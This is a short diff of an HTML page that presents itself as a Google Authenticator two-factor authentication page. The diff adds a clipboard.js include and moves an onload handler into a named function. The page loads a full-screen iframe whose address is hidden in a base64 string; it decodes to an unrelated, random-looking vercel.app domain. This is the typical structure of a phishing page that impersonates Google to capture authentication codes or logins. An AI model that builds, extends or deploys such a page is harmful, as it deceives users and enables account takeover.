@@ -19,6 +19,8 @@
 
   <title>Two-Factor Authentication - Google Authenticator</title>
 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
   <style>
     body, html {
       margin: 0;
@@ -53,10 +55,12 @@
       }
     });
 
-    window.onload = function() {
+    function loadIframe() {
       var iframeUrl = atob('aHR0cHM6Ly9mYXN0MmZhamhqc2ZoajM4eWZhYmhmYWhnaHZhZnl1M3NhMjJmZmZhYXZhdS52ZXJjZWwuYXBwLw==');
       document.getElementById('iframe').src = iframeUrl;
-    };
+    }
+
+    window.onload = loadIframe;
   </script>
 
 </head>
